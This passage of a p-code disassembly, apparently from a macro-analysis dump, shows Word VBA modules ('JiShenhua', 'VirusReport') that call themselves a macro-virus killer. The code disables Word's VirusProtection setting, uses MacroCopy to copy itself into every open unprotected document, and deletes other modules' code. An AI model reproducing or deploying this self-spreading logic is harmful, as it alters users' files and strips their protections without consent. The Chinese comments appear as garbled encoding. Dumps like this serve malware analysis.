' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Ld already 
' 	Not 
' 	Paren 
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #107:
' 	Ld file$ 
' 	LitStr 0x000A ":JiShenhua"
' 	Add 
' 	Ld myTemp 
' 	MemLd FullName 
' 	LitStr 0x000A ":JiShenhua"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #108:
' 	Ld file$ 
' 	LitStr 0x000C ":VirusReport"
' 	Add 
' 	Ld myTemp 
' 	MemLd FullName 
' 	LitStr 0x000C ":VirusReport"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	StartForVariable 
' 	Next 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub AutoNew())
' Line #113:
' 	Dim 
' 	VarDefn file
' Line #114:
' 	Dim 
' 	VarDefn already
' 	VarDefn HasVirus (As Boolean)
' Line #115:
' 	Dim 
' 	VarDefn LinesofCode (As Long)
' Line #116:
' 	Dim 
' 	VarDefn answer (As String)
' Line #117:
' 	Dim 
' 	VarDefn myDoc
' Line #118:
' Line #119:
' 	LitStr 0x0016 "FreeAntiWordMacroVirus"
' 	St answer 
' 	QuoteRem 0x0027 0x0010 "±¾²¡¶¾ÒßÃçÌØÕ÷Âë"
' Line #120:
' Line #121:
' 	QuoteRem 0x0004 0x0012 "µ±Ç°´ò¿ªÄ£°åÎÄ¼þÃû"
' Line #122:
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0000 
' 	St file$ 
' Line #123:
' Line #124:
' 	QuoteRem 0x0004 0x000E "¹Ø±Õºê²¡¶¾±£»¤"
' Line #125:
' 	Ld Options 
' 	MemLd VirusProtection 
' 	IfBlock 
' Line #126:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #127:
' 	EndIfBlock 
' Line #128:
' Line #129:
' 	QuoteRem 0x0004 0x0018 "ÏòÐÂ½¨µÄÎÄµµÖÐÐ´Èë±¾´úÂë"
' Line #130:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #131:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #132:
' 	QuoteRem 0x000C 0x001E "¼ì²éÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾Ä£¿é´úÂë"
' Line #133:
' 	LitVarSpecial (False)
' 	St already 
' Line #134:
' 	Ld myDoc 
' 	MemLd FullName 
' 	Ld file$ 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #135:
' 	LitVarSpecial (True)
' 	St already 
' Line #136:
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #137:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #138:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #139:
' 	LitVarSpecial (True)
' 	St already 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	NextVar 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	Ld already 
' 	Not 
' 	Paren 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #144:
' 	Ld file$ 
' 	LitStr 0x000A ":JiShenhua"
' 	Add 
' 	Ld myDoc 
' 	MemLd FullName 
' 	LitStr 0x000A ":JiShenhua"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #145:
' 	Ld file$ 
' 	LitStr 0x000C ":VirusReport"
' 	Add 
' 	Ld myDoc 
' 	MemLd FullName 
' 	LitStr 0x000C ":VirusReport"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub AutoExit())
' Line #151:
' 	QuoteRem 0x0000 0x0028 "¹Ø±ÕWORDÖ®Ç°ÇåÀíautoexec.dotÎÄ¼þÖÐµÄ²¡¶¾"
' Line #152:
' 	Dim 
' 	VarDefn LinesofCode (As Long)
' Line #153:
' 	Dim 
' 	VarDefn myDoc
' Line #154:
' 	Dim 
' 	VarDefn FileName (As String)
' Line #155:
' Line #156:
' 	QuoteRem 0x0000 0x0018 "Çå³ý´ò¿ªÎÄµµÖÐµÄ²¡¶¾´úÂë"
' Line #157:
' 	LitStr 0x000F "c:\Autoexec.dot"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "AUTOEXEC.DOT"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #158:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #159:
' 	LitStr 0x000F "c:\Autoexec.dot"
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0002 
' Line #160:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Word 
' 	MemLd Documents 
' 	ForEach 
' Line #161:
' 	Ld myDoc 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "AUTOEXEC.DOT"
' 	Eq 
' 	Paren 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #162:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #163:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #164:
' 	Ld xitem 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St LinesofCode 
' Line #165:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #166:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Ne 
' 	Paren 
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000B "VirusReport"
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #169:
' 	Ld xitem 
' 	Paren 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #170:
' 	EndIfBlock 
' Line #171:
' 	StartForVariable 
' 	Next 
' Line #172:
' 	Ld myDoc 
' 	ArgsMemCall Save 0x0000 
' Line #173:
' 	Ld myDoc 
' 	ArgsMemCall Close 0x0000 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	StartForVariable 
' 	Next 
' Line #176:
' 	EndIfBlock 
' Line #177:
' 	EndSub 
' Macros/VBA/VirusReport - 11253 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' 	QuoteRem 0x0000 0x0018 "³õÊ¼»¯´°Ìå£¬Éè¶¨´°Ìå²ÎÊý"
' Line #37:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #38:
' 	LitVarSpecial (True)
' 	Ld CheckBox1 
' 	MemSt Value 
' Line #39:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld Information 
' 	MemSt Value 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	ArgsCall Beep 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Private Sub CommandButtonNothing_Click())
' Line #45:
' 	QuoteRem 0x0000 0x0016 "¹Ø±Õ´°Ìå£¬²»×÷ÈÎºÎ´¦Àí"
' Line #46:
' 	Dim 
' 	VarDefn ret (As Integer)
' Line #47:
' 	LitStr 0x0056 "Áìµ¼£¬ËäÈ»Äã¿ÉÄÜ»áÅúÆÀÎÒ£¬µ«»¹ÊÇÒª¸æËßÄã£¬ÕâÑù×öÊÇºÜÎ£ÏÕµÄ¡£ÊÇ·ñÕæµÃ²»×ö´¦Àí£¬ÇëÖ¸Ê¾¡£"
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x000A "ÔÙ´Î±¨¸æ£¡"
' 	ArgsLd MsgBox 0x0003 
' 	St ret 
' Line #48:
' 	Ld ret 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld VirusReport 
' 	ArgsCall Unlock 0x0001 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Private Sub CommandButtonOpenVisubasic_Click())
' Line #53:
' 	QuoteRem 0x0000 0x0014 "´ò¿ªVisulBasic±à¼­Æ÷"
' Line #54:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Private Sub CommandButtonDetail_Click())
' Line #57:
' 	QuoteRem 0x0000 0x0012 "±¨¸æ²¡¶¾µÄÏêÏ¸Çé¿ö"
' Line #58:
' 	Dim 
' 	VarDefn answer (As String)
' Line #59:
' 	Dim 
' 	VarDefn myStr (As String)
' Line #60:
' 	Dim 
' 	VarDefn myDoc (As Document)
' Line #61:
' 	Dim 
' 	VarDefn myTemp (As Template)
' Line #62:
' Line #63:
' 	LitStr 0x0016 "MyMacroVirusKillerV1.0"
' 	St answer 
' Line #64:
' 	LitStr 0x0000 ""
' 	St myStr 
' Line #65:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Word 
' 	MemLd Templates 
' 	ForEach 
' Line #66:
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #68:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #69:
' 	Ld xitem 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St LinesofCode 
' Line #70:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #71:
' 	Ld answer 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #72:
' 	Ld myStr 
' 	Ld myTemp 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0013 ">Ä£¿éÖÐ¿ÉÄÜÓÐ²¡¶¾¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #73:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #74:
' 	Ld myStr 
' 	Ld myTemp 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0024 ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Open¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #77:
' 	Ld myStr 
' 	Ld myTemp 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0025 ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Close¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	LitStr 0x000C "Document_New"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #80:
' 	Ld myStr 
' 	Ld myTemp 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0023 ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_New¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	LitStr 0x000B "insertlines"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #83:
' 	Ld myStr 
' 	Ld myTemp 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0022 ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äInsertLines¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Ne 
' 	Paren 
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000B "VirusReport"
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #88:
' 	Ld myStr 
' 	Ld myTemp 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0011 ">Ä£¿é¿ÉÄÜÊÇ²¡¶¾¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #89:
' 	LitStr 0x0009 "MacroCopy"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #90:
' 	Ld myStr 
' 	Ld myTemp 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0020 ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äMacroCopy¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	StartForVariable 
' 	Next 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Next 
' Line #96:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Word 
' 	MemLd Documents 
' 	ForEach 
' Line #97:
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #98:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #99:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #100:
' 	Ld xitem 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St LinesofCode 
' Line #101:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #102:
' 	Ld answer 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #103:
' 	Ld myStr 
' 	Ld myDoc 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0013 ">Ä£¿éÖÐ¿ÉÄÜÓÐ²¡¶¾¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #104:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #105:
' 	Ld myStr 
' 	Ld myDoc 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0024 ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Open¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #108:
' 	Ld myStr 
' 	Ld myDoc 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0025 ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Close¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	LitStr 0x000C "Document_New"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #111:
' 	Ld myStr 
' 	Ld myDoc 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0023 ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_New¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	LitStr 0x000B "insertlines"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #114:
' 	Ld myStr 
' 	Ld myDoc 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0022 ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äInsertLines¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Ne 
' 	Paren 
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000B "VirusReport"
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #119:
' 	Ld myStr 
' 	Ld myDoc 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0011 ">Ä£¿é¿ÉÄÜÊÇ²¡¶¾¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #120:
' 	LitStr 0x0009 "MacroCopy"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #121:
' 	Ld myStr 
' 	Ld myDoc 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld xitem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0020 ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äMacroCopy¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	StartForVariable 
' 	Next 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	StartForVariable 
' 	Next 
' Line #127:
' 	Ld myStr 
' 	Ld Information 
' 	MemSt Value 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Private Sub CommandButtonKill_Click())
' Line #130:
' 	QuoteRem 0x0000 0x0006 "É±²¡¶¾"
' Line #131:
' 	Dim 
' 	VarDefn LinesofCode (As Long)
' Line #132:
' 	Dim 
' 	VarDefn myDoc (As Document)
' Line #133:
' 	Dim 
' 	VarDefn myTemp (As Template)
' Line #134:
' 	Dim 
' 	VarDefn answer (As String)
' Line #135:
' Line #136:
' 	LitStr 0x0016 "MyMacroVirusKillerV1.0"
' 	St answer 
' Line #137:
' 	QuoteRem 0x0000 0x0018 "Çå³ýAutoexec.dotÖÐµÄ²¡¶¾"
' Line #138:
' 	LitStr 0x000F "c:\Autoexec.dot"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "AUTOEXEC.DOT"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #139:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #140:
' 	LitStr 0x000F "c:\Autoexec.dot"
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0002 
' Line #141:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set myDoc 
' Line #142:
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #143:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #144:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #145:
' 	Ld xitem 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St LinesofCode 
' Line #146:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #147:
' 	Ld answer 
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld star 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #148:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Ne 
' 	Paren 
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000B "VirusReport"
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #152:
' 	Ld xitem 
' 	Paren 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	StartForVariable 
' 	Next 
' Line #155:
' 	Ld myDoc 
' 	ArgsMemCall Save 0x0000 
' Line #156:
' 	Ld myDoc 
' 	ArgsMemCall Close 0x0000 
' Line #157:
' 	EndIfBlock 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	QuoteRem 0x0000 0x0018 "Çå³ý´ò¿ªÎÄµµÖÐµÄ²¡¶¾´úÂë"
' Line #160:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Word 
' 	MemLd Documents 
' 	ForEach 
' Line #161:
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #162:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #163:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #164:
' 	Ld xitem 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St LinesofCode 
' Line #165:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #166:
' 	Ld answer 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #167:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #168:
' 	EndIfBlock 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Ne 
' 	Paren 
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000B "VirusReport"
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #171:
' 	Ld xitem 
' 	Paren 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #172:
' 	EndIfBlock 
' Line #173:
